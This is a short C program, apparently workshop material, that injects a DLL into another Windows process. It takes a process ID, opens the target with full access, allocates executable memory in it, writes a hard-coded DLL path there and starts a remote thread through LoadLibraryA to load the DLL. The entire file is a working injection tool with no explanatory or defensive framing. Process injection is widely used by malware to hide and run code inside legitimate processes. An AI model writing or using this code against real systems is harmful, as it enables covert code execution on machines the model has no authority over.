#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[]) {

unsigned char pathDLL[] = "C:\\Users\\hp\\Desktop\\workshoptemp\\mydll.dll";
// Check arguments 
if(argc != 2){
    printf("[+] Usage : inject.exe [PID]\n");
    exit(0);
}
 

int process_id = atoi(argv[1]);
LPVOID base_address;
HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
if (process) {
    printf("[+] Handle retrieved successfully!\n");
    printf("[+] Handle value is %p\n", process);
    LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if(addr == NULL) {
        printf("[-]Error: the LoadLibraryA function was not found inside kernel32.dll library.\n");
        exit(0);
    }
    printf("[+] Module sucessfully loaded! from 0x%X\n", addr );
    base_address = VirtualAllocEx(process, NULL, sizeof(pathDLL), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (base_address) {
        if(WriteProcessMemory(process, base_address, pathDLL, strlen(pathDLL), NULL)){
            printf("[+] wrote sucessfully! from 0x%X\n", base_address );
        }
        HANDLE threadID = CreateRemoteThread(process, NULL,0,(LPTHREAD_START_ROUTINE)addr,base_address, 0, NULL);
        if(threadID==NULL){
            printf("[-] the remote thread could not be created.\n");
        }   
        else{
            printf("[+] the remote thread created sucessfully.\n");
        }
    }
    else {
        printf("[+] Unable to allocate memory ..\n");
    }    
}
else{
    printf("[-] Enable to retrieve process handle\n");
}
CloseHandle(process); 
}